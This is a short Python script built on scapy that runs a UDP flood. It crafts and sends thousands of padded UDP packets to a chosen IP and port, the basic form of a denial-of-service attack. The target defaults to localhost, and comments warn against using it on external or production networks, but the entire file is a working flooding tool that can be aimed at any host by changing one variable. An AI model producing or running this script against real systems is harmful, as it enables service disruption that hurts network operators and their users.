from scapy.all import IP, UDP, Raw, send
import time

def udp_flood(target_ip, target_port, num_packets=1000, packet_size=100):
    print(f"Starting UDP flood to {target_ip}:{target_port} with {num_packets} packets of size {packet_size} bytes...")
    for i in range(num_packets):
        # Craft a UDP packet
        packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="X"*packet_size)
        send(packet, verbose=0)
        if i % 100 == 0:
            print(f"Sent {i} packets...")
        time.sleep(0.01) # Small delay to avoid overwhelming the system
    print("UDP flood finished.")

if __name__ == "__main__":
    # IMPORTANT: Replace with a local IP address and an unused port for testing.
    # DO NOT use this script against external networks or production systems.
    # Example: target_ip = "127.0.0.1" (localhost) or your local machine's IP
    # Example: target_port = 5000 (an arbitrary unused port)
    
    target_ip = "127.0.0.1"  # Change this to your local machine's IP or localhost
    target_port = 5000       # Change this to an unused port
    
    udp_flood(target_ip, target_port, num_packets=2000, packet_size=500)